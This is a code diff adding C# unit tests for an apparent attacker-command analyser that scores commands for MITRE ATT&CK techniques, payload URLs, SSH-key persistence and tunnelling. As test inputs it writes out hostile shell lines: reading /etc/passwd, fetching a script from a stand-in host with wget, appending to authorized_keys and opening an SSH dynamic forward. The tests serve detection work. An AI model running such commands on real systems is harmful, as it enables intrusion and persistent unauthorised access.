@@ -117,3 +117,34 @@ public class SCPDetectorTests
         Assert.Equal(expected, result);
     }
 }
+
+public class DataHarvesterTests
+{
+    [Fact]
+    public void LevenshteinDistance_DetectsPasswordMutation()
+    {
+        var distance = DataHarvester.LevenshteinDistance("root:password1", "root:password2");
+        Assert.Equal(1, distance);
+    }
+
+    [Fact]
+    public void AnalyzeCommand_ExtractsPayloadAndDiscoverySignals()
+    {
+        var analysis = DataHarvester.AnalyzeCommand("cat /etc/passwd; wget http://example.com/a.sh -O /tmp/a.sh");
+
+        Assert.Equal(1, analysis.DiscoveryDepthScore);
+        Assert.Contains("http://example.com/a.sh", analysis.PayloadUrls);
+        Assert.Contains("T1105", analysis.MitreAttackTechniques);
+        Assert.Contains("T1083", analysis.MitreAttackTechniques);
+    }
+
+    [Fact]
+    public void AnalyzeCommand_DetectsPersistenceAndTunneling()
+    {
+        var analysis = DataHarvester.AnalyzeCommand("echo key >> ~/.ssh/authorized_keys && ssh -D 1080 host");
+
+        Assert.Equal("ssh_authorized_keys", analysis.PersistenceVector);
+        Assert.Equal("dynamic_forward", analysis.TunnelingIntent);
+        Assert.True(analysis.AssetValuePerceptionScore > 0);
+    }
+}
